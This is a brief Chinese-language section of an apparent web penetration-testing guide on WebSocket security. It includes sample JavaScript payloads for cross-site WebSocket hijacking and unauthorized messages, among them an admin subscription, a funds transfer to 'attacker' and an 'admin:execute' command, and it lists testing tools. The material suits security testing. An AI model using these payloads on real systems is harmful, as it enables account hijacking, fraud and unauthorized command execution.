## 八、WebSocket安全（高级）

### 8.1 攻击面
```javascript
// 1. 跨站WebSocket劫持（CSWSH）
// 握手只验Cookie不验Origin
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => ws.send('{"type":"get_messages","user_id":2}');

// 2. 认证Token位置
ws://target.com/ws?token=xxx
// 若token在URL → Referer/日志泄露
// Cookie vs Header token：仅验其一可伪造

// 3. 子协议（Sec-WebSocket-Protocol）注入
// 服务端信任子协议选择 → 切换特权协议

// 4. 越权消息
ws.send('{"type":"subscribe","channel":"admin"}');
ws.send('{"type":"transfer","to":"attacker","amount":10000}');
ws.send('{"type":"admin:execute","cmd":"ls"}');

// 5. 消息注入XSS
// 服务端把消息拼进DOM → 存储型XSS
```

### 8.2 测试工具
- Burp WebSockets / Turbo Intruder for WS
- wscat / websocat 命令行
- 修改握手Origin验证CSWSH
- 身份切换测试（用不同用户Cookie连同一WS）

